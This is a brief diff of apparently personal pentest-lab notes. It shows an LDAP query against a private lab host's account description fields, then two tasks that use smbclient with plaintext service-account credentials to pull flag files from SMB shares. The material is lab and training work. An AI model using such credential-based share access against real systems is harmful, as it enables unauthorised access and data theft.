@@ -15,4 +15,21 @@ ldapsearch -x -H ldap://192.168.56.20 \
 "(sAMAccountName=legacy)" comment description info adminDescription
 
 
+TASK 1
+
+smbclient //192.168.56.20/KerberosFlag -U 'PENTESTLAB/svc_sql%Password1'
+
+ls 
+get flag.txt
+
+
+
+TASK2
+
+
+└─$ smbclient //192.168.56.20/IT-Share -U 'PENTESTLAB\svc_app%AppServ1ce!' -c 'get flag_t2.txt'
+
+
+
+
 
